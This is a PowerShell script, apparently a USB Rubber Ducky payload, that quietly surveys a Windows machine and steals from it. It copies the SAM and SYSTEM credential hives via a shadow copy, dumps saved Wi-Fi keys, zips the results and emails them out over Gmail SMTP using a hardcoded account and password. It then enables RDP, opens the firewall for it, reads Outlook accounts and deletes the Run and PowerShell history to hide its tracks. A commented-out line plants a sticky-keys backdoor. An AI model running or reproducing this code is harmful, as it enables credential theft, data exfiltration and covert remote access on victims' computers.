$folderDateTime = (get-date).ToString('d-M-y HHmmss')

$userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime

$fileSaveDir = New-Item  ($userDir) -ItemType Directory

$date = get-date

$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#c{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"

$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'

$Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"

$u = 0

$allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)

$Report =  $Report + '<div id=right><h3>USB Devices</h3><table>'

do {

$gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)

$Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"

Write-Output $fullUSB

$u ++

} while ($u -lt $allUsb.Count)

$Report = $Report + '</table></div>'

$Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>'

$Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path)
 
$Report = $Report + '</div>'

$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')

$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID }

$addSlash  = $shadow.DeviceObject + '\'

cmd /c mklink C:\shadowcopy $addSlash

Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $fileSaveDir

Copy-Item 'C:\shadowcopy\Windows\System32\config\SYSTEM' $fileSaveDir

Remove-Item -recurse -force 'C:\shadowcopy'


Start-Transcript -UseMinimalHeader -Path $userDir"\wifi.txt"
dir *.xml |% {
$xml=[xml] (get-content $_)
Write-Host $xml.WLANProfile.SSIDConfig.SSID.name `t $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
}
Stop-Transcript

$Report =  $Report + '<div id=c><h3>Network Information</h3>'

$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
 
$Report = $Report + '</table></div>'

$Report >> $fileSaveDir'/ComputerInfo.html'

function copy-ToZip($fileSaveDir){

$srcdir = $fileSaveDir

$zipFile = 'C:\Windows\Report.zip'

if(-not (test-path($zipFile))) {

set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))

(dir $zipFile).IsReadOnly = $false}

$shellApplication = new-object -com shell.application

$zipPackage = $shellApplication.NameSpace($zipFile)

$files = Get-ChildItem -Path $srcdir

foreach($file in $files) {

$zipPackage.CopyHere($file.FullName)

while($zipPackage.Items().Item($file.name) -eq $null){

Start-sleep -seconds 1 }}}

copy-ToZip($fileSaveDir)

try {

$Sender = 'kingofangel1197@gmail.com'

$Recipient = 'kingofangel1197@gmail.com'

$pass = ConvertTo-SecureString 'xojlsxhulxyybmit' -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)

Send-MailMessage -From $Sender -To $Recipient -Subject "DuckToolkit Report" -Body "Please find attached the DuckToolkit reconnaissance report." -SmtpServer "smtp.gmail.com" -Port 587  -UseSSL -credential $creds -Attachments "C:\Windows\Report.zip"}

catch {

break }

remove-item $fileSaveDir -recurse

remove-item 'C:\Windows\Report.zip'

$Report =  $Report + '<div id=c><h3> Installed Programs</h3> '

$Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)

$Report = $Report + '</table></div>'

$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired

$UserType = $UserInfo.AccountType

$UserSid = $UserInfo.SID
 
$UserPass = $UserInfo.PasswordRequired

$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')

$Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>"
 
$Report = $Report + '</div>'

$SysBootTime = Get-WmiObject Win32_OperatingSystem

$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime

$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)

$SerialNo = $SysSerialNo.SerialNumber

$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model

$SysManufacturer = $SysInfo.Manufacturer

$SysModel = $SysInfo.Model

$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption

$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"

$HD = [math]::truncate($disk.Size / 1GB)

$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)

$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize

$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)

$SysCpu = Get-WmiObject Win32_Processor | Select Name

$Cpu = $SysCpu.Name
 
$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber

$HardSerialNo = $HardSerial.SerialNumber
 
$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name

$graphicsCard = gwmi win32_VideoController |select Name

$graphics = $graphicsCard.Name

$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1

$DriveLetter = $CDDrive.Drive

$DriveName = $CDDrive.Caption

$Disk = $DriveLetter + '\' + $DriveName

$Firewall = New-Object -com HNetCfg.FwMgr

$FireProfile = $Firewall.LocalPolicy.CurrentProfile  

$FireProfile = $FireProfile.FirewallEnabled

$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  

### ???
#REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe

REG ADD HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f

Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0

Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1

netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes

netsh advfirewall firewall set rule group='remote desktop' new enable=Yes

### Windows Share Drive C:
#$Share = [WmiClass]'Win32_Share'
#$Share.Create('C:\', 'netShare', 0)
#netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes

### Get local Email config from Outlook | Not Finish to complete |
$outlookApplication = New-Object -ComObject 'Outlook.Application'
$accounts = $outlookApplication.Session.Accounts
$accounts | Select DisplayName, SmtpAddress

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Get Neerby Wifi | Not Finish to complete |
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$Wifi"} | ConvertTo-Json
